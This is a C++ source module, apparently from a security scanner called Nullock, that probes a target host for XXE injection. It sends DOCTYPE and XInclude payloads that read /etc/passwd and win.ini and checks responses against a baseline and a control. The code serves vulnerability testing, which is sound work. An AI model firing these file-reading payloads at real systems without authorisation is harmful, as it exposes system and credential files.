#include "xxe_injection.hpp"
#include "networking.hpp"

#include <QRegularExpression>

namespace Nullock::Core::XxeInjection {

namespace {

struct Payload {
    const char *technique;
    const char *target;
    QByteArray  xml;
    QRegularExpression sig;   // content fingerprint of the target file
};

const QList<Payload> &payloads() {
    static const QRegularExpression passwdSig("root:[^:\\n]*:0:0:[^:\\n]*:[^:\\n]*:");
    static const QRegularExpression wininiSig("\\[(?:fonts|extensions|mci extensions)\\]",
                                              QRegularExpression::CaseInsensitiveOption);
    static const QList<Payload> p = {
        // Classic DOCTYPE + external general entity.
        { "file-passwd", "/etc/passwd",
          "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
          "<!DOCTYPE r [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>"
          "<r>&xxe;</r>", passwdSig },
        { "file-winini", "c:/windows/win.ini",
          "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
          "<!DOCTYPE r [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]>"
          "<r>&xxe;</r>", wininiSig },
        // XInclude (parse=text): reads a file with NO DOCTYPE/entity, so it lands
        // on parsers hardened with disallow-doctype-decl that still process
        // XInclude (Xerces/JAXP setXIncludeAware, libxml2 XML_PARSE_XINCLUDE, ...).
        { "xinclude-passwd", "/etc/passwd",
          "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
          "<r xmlns:xi=\"http://www.w3.org/2001/XInclude\">"
          "<xi:include parse=\"text\" href=\"file:///etc/passwd\"/></r>", passwdSig },
        { "xinclude-winini", "c:/windows/win.ini",
          "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
          "<r xmlns:xi=\"http://www.w3.org/2001/XInclude\">"
          "<xi:include parse=\"text\" href=\"file:///c:/windows/win.ini\"/></r>", wininiSig },
    };
    return p;
}

} // namespace

Result test(const Request &req) {
    Result result;
    if (req.host.isEmpty()) { result.error = "host required"; return result; }

    HttpClient client;
    const quint16 port = static_cast<quint16>(req.port);
    auto send = [&](const QByteArray &body) {
        ++result.requestsSent;
        return client.send(req.host, port, req.tls, buildRequest(req, body));
    };

    // Benign baseline (no DOCTYPE) -- establishes status and that a file-shaped
    // string isn't already present without any entity.
    const auto base = send("<?xml version=\"1.0\"?><r>nullock</r>");
    if (!base.ok) { result.error = "baseline failed: " + base.errorMessage; return result; }
    result.baselineStatus = base.parsed.statusCode;

    // Inert-DOCTYPE control: same DOCTYPE shell as the attack payloads but an
    // INTERNAL (non-SYSTEM) entity. A hardened disallow-doctype server returns
    // the SAME error page for this as for the SYSTEM payloads, so any file-shaped
    // string in that error page is subtracted out -- only a genuinely resolved
    // external entity appears in a SYSTEM response but not here.
    const auto inert = send("<?xml version=\"1.0\"?>"
                            "<!DOCTYPE r [<!ENTITY xxe \"nullock-inert-control\">]><r>&xxe;</r>");
    const QByteArray inertBody = inert.ok ? inert.parsed.body : QByteArray();

    for (const Payload &p : payloads()) {
        const auto r = send(p.xml);
        if (!r.ok) continue;
        const QString sig = confirmReadSig(p.sig, r.parsed.body, r.parsed.statusCode,
                                           base.parsed.body, inertBody);
        if (!sig.isEmpty()) {
            result.hits.append({ QString::fromUtf8(p.technique),
                                 QString::fromUtf8(p.target), sig });
            result.vulnerable = true;
        }
    }

    return result;
}

} // namespace Nullock::Core::XxeInjection
